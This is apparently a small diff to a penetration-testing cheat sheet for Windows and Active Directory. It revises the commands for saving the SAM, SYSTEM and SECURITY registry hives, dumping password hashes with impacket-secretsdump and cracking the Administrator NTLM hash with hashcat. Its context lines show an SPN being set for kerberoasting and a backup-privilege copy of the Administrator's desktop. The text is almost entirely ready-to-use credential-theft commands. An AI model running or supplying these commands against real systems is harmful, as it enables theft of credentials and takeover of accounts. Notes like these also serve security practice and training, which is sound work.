@@ -769,10 +769,8 @@ Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get
 robocopy /b \Users\Administrator\Desktop .
 
 [*] SAM
-cd c:\programdata; reg save hklm\sam SAM; reg save hklm\system SYSTEM;
-download SAM
-download SYSTEM
-impacket-secretsdump LOCAL -sam SAM -system SYSTEM
+cd c:\programdata; reg save hklm\sam SAM; reg save hklm\system SYSTEM; reg save hklm\security SECURITY
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
 echo 'Administrator:500:...................' > hashes
 hashcat -m 1000 -a 0 hashes /usr/share/wordlists/rockyou.txt
 
